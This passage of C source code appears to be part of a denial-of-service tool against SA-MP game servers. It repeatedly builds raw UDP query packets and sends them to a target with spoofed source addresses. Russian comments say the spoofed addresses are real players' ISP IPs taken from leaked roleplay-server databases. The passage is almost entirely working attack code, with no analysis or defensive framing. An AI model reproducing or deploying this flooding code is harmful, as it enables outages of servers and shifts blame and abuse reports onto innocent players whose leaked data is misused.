		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv33(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv34(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv35(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv36(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		//////////////////////////////////////////////////////////////////////////////////////////////////
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		//////////////////////////////////////////////////////////////////////////////////////////////////
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		//////////////////////////////////////////////////////////////////////////////////////////////////
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_pp1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
